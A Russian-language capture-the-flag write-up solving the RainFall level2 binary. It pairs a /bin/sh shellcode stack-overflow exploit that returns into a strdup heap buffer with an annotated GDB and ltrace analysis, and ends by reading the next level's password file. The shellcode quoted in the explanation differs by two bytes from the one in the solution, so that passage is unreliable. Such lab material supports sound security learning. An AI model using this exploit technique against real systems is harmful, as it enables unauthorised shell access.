# Решение

echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" > /tmp/lvl2
echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' >> /tmp/lvl2
echo -ne '\x08\xa0\x04\x08' >> /tmp/lvl2

cat /tmp/lvl2 - | ./level2
cd ../level3
cat .pass


# Объяснение

1. Изучим поведение программы.

Программа требует ввода значений через stdin, затем возвращает эти же значений через stdout.
level2@RainFall:~$ ./level2
AAA
AAA

Делаем проверку на переполняемость буфера.
level2@RainFall:~$ python -c 'print "A"*100' > /tmp/test
level2@RainFall:~$ cat /tmp/test | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)

Буфер переполняется. Хорошо)

2. ltrace.
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff6f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                              = 0
gets(0xbffff5fc, 0, 0, 0xb7e5ec73, 0x80482b5A
)                   = 0xbffff5fc
puts("A"A
)                                                       = 2
strdup("A")                                                     = 0x0804a008
+++ exited (status 8) +++

Видим, что используется функция gets, которая имеет уязвимость, позволяющую переписывать стек.(как в прошлом задании).

3. GDB
level2@RainFall:~$ gdb level2

В функции main обнаруживаем из интересного только выхов функции p:
   0x08048545 <+6>:	call   0x80484d4 <p>

Изучим функцию p.
   0x080484d4 <+0>:	    push   %ebp                         // пролог
   0x080484d5 <+1>: 	mov    %esp,%ebp
   0x080484d7 <+3>:	    sub    $0x68,%esp                   // Выделяем память на стеке (104 байта)
   0x080484da <+6>:	    mov    0x8049860,%eax               // Кладем в регистр EAX адрес потока stdout.(x/x 0x8049860)
   0x080484df <+11>:	mov    %eax,(%esp)                  // Кладем в стек адрес stdout как аргумент для функции fflush
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>       // Выполняем функцию fflush с аргументом stdout
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax             // Записываем в регистр EAX адрес 0xbffff5dc (p/x $ebp-0x4c)
   0x080484ea <+22>:	mov    %eax,(%esp)                  // Значение регистра EAX записываем по адресу, лежащему в регистре ESP
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>         // Считываем значения в буфер из stdin
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax               // Записываем адрес, который лежит в EBP + 4 в регистр EAX
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)              // Записываем по адресу, лежащему в EBP, - 12 значение регистра EAX
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax              // Записываем значение из прошлого шага в регистр EAX
   0x080484fb <+39>:	and    $0xb0000000,%eax             // Выполняем AND с 0xb0000000 и значением в регистре EAX, записываем в EAX
   0x08048500 <+44>:	cmp    $0xb0000000,%eax             // Делаем сравнение значений. !! Проверка, что адрес возврата не в стеке !!
   0x08048505 <+49>:	jne    0x8048527 <p+83>             // Если значения выше не равны (адрес возврата не в стеке), прыгаем на строку +83
   1 ветка исполнения
   0x08048507 <+51>:	mov    $0x8048620,%eax              // Кладем в регистр EAX адрес строки "(%p)\n" (x/6cb 0x8048620)
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx              // Кладем в регистр адрес EDX адрес возврата
   0x0804850f <+59>:	mov    %edx,0x4(%esp)               // Кладем из регистра EDX адрес возврата в стек. 2 аргумент printf.
   0x08048513 <+63>:	mov    %eax,(%esp)                  // Кладем адрес строки "(%p)\n" из регистра по пдресу верхушки стека
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>       // Выполняем вызов printf с двумя аргументами выше
   0x0804851b <+71>:	movl   $0x1,(%esp)                  // Кладем в стек значение 1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>        // Выполняем exit с аргументом 1
   2 ветка исполнения
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax             // Кладем адрес начала буфера в регистр EAX
   0x0804852a <+86>:	mov    %eax,(%esp)                  // Помещаем адрес буфера на вершину стрека
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>         // Выполняем puts с аргументом в виде буфера
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax             // Кладем адрес начала буфера в регистр EAX
   0x08048535 <+97>:	mov    %eax,(%esp)                  // Помещаем адрес буфера на вершину стрека
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>       // Вызываем strdup с аргументом в виде буфера. (В EAX будет лежать адрес памяти в куче на строку)
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret

Из анализа кода мы понимаем, что можем переписать адрес возврата функции, но он не может указывать на стек, иначе не пройдем
проверку на смещении +49.

Если попробовать несколько раз запустить программу, то увидим, что адрес, который возвращает strdup
всегда один и тот же - 0x804a008.

Сделаем хитрый ход, в адресе возврата укажем не адрес на внедряемый шеллкод в стеке, а адрес строки, которую возвращает strdup.

4. Определем, как проведем перезапись стека.

- шеллкод = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' 25 байт
- До адреса возврата указываем 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  55 байт
- Адрес возврата на строку, полученную из strdup - \x08\xa0\x04\x08, байты в обратном порядке, тк little endian. 4 байта

Шеллкод взят с этой страницы - http://shell-storm.org/shellcode/files/shellcode-827.php
Куда поместить адрес возврата можно посмотреть по стеку:
b *p +100
x/100wx $esp
.........
0xbffff5d0:	0x080482b5	0xbffff6d4	0xbffff81c	0x41414141 - начинается буфер
0xbffff5e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff600:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff610:	0x41414141	0x41414141	0x41414141	0x0804854a -- тут лежит не 0x41414141, тк сюда пишется адрес возврата для его проверки
0xbffff620:	0x41414141	0x41414141	0xbffff600	0x0804854a -- адрес возврата

Адрес возврата 4 байта после 80 байт с начала буфера.
